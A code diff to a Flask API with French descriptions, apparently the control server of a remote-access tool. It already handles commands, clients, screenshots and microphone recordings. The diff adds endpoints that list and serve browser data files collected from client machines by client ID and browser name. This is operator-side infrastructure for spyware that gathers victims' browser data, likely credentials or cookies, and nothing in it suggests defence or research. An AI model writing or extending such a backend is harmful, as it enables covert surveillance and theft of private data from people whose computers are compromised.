@@ -37,6 +37,7 @@ command_ns = api.namespace('api/v1/command', description='Command operations')
 clients_ns = api.namespace('api/v1/clients', description='Client operations')
 screenshot_ns = api.namespace('api/v1/screenshot', description='Screenshot operations')
 microphone_ns = api.namespace('api/v1/microphone', description='Microphone operations')
+browser_ns = api.namespace('api/v1/browser', description='Browser data operations')
 
 auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
 command_model = api.model('Command', {
@@ -62,6 +63,12 @@ microphone_model = api.model('Microphone', {
     'id': fields.Integer(required=True, description='ID de l\'enregistrement audio'),
     'file_path': fields.String(required=True, description='Chemin du fichier de l\'enregistrement audio'),
     'date_created': fields.String(required=True, description='Date de création de l\'enregistrement audio')
+})
+browser_model = api.model('Browser', {
+    'id': fields.Integer(required=True, description='ID des données du navigateur'),
+    'browser_name': fields.String(required=True, description='Nom du navigateur'),
+    'file_path': fields.String(required=True, description='Chemin du fichier des données du navigateur'),
+    'date_created': fields.String(required=True, description='Date de création des données du navigateur')
 })
 
 client_params = api.parser()
@@ -164,6 +171,31 @@ class GetMicrophoneAudio(Resource):
             return send_file(microphone.file_path, mimetype='audio/wav')
         else:
             return {'status': 'error', 'message': 'Enregistrement audio non trouvé.'}, 404
+
+
+@browser_ns.route('/client/<int:client_id>/<string:browser_name>')
+class GetBrowserDataByClientId(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    @browser_ns.marshal_with(browser_model, as_list=True)
+    def get(self, client_id, browser_name):
+        browser_data = Command.query.filter_by(client_id=client_id, type=CommandType.BROWSER_DATA,
+                                               browser_name=browser_name).all()
+        for data in browser_data:
+            data.date_created = data.date_created.strftime('%d/%m/%Y à %H:%M:%S')
+        return browser_data, 200
+
+
+@browser_ns.route('/data/<int:browser_id>')
+class GetBrowserDataFile(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    def get(self, browser_id):
+        data = Command.query.get(browser_id)
+        if data and os.path.exists(data.file_path):
+            return send_file(data.file_path, mimetype='text/plain')
+        else:
+            return {'status': 'error', 'message': 'Fichier de données du navigateur non trouvé.'}, 404
 
 
 @socketio.on('connect')
